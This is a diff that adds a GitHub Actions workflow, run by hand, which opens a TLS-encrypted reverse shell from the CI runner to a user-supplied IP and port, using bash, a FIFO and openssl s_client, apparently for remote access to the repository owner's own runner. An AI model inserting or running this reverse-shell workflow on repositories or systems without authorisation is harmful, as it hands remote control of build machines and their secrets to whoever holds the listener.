@@ -1,0 +1,29 @@
+name: OpenSSL Reverse Shell
+
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: "IP Address of your workstation"
+        required: true
+      port:
+        description: "Port listening for reverse shell"
+        required: true
+        default: '2222'
+
+jobs:
+  openssl:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install Utils
+        run: |
+          sudo apt-get update
+          sudo apt-get -qqy install openssl
+
+      - name: OpenSSL Reverse Shell
+        run: |
+          echo "${{ secrets.REV_SHELL_CERT }}" > /tmp/cert.pem
+          mkfifo /tmp/s
+          /bin/bash -i < /tmp/s 2>&1 | \
+          openssl s_client -quiet -strict -verify 1 -verify_return_error -CAfile /tmp/cert.pem -connect ${{ github.event.inputs.ip }}:${{ github.event.inputs.port }} > /tmp/s
+          rm /tmp/s
